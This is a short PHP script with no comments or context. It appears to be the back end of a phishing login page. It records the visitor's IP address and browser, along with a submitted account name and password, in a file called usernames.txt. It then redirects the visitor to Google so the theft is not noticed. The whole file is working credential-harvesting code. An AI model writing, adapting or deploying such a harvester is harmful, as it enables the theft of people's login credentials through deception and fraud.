<?php 
 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) 
    { 
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']; 
    } 
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) 
    { 
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']; 
    } 
else 
    { 
      $ipaddress = $_SERVER['REMOTE_ADDR']; 
    } 
$browser = $_SERVER['HTTP_USER_AGENT']."\r\n"; 
file_put_contents("usernames.txt", "\nUser-Agent: " . $browser . "IP: " . $ipaddress . "\nAccount: \"" . $_POST['key2'] . "\" Pass: \"" . $_POST['key1'] . "\"\n", FILE_APPEND);
header('Location: https://www.google.com');
exit();
